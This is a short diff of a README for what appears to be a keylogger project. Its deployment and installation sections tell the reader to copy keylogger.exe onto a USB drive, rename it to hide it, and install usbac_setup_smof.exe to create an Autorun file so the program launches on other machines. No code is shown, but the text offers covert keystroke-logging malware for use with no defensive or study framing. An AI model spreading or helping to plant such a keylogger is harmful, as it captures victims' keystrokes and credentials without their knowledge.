@@ -7,7 +7,7 @@
 
 ## Deployment
 
-To deploy this project run you need a USB drive
+To deploy this project you need a USB drive
 
 ```bash
    copy and paste keylogger.exe file in you USB drive
@@ -17,7 +17,7 @@ NOTE : For the anonymity of program rename the program as you want.
 
 ## Installation
 
-Install my-project with npm
+Install usbac_setup_smof.exe
 
 ```bash
   install usbac_setup_smof.exe in your USB drive (It will create a Autorun file in USB drive)
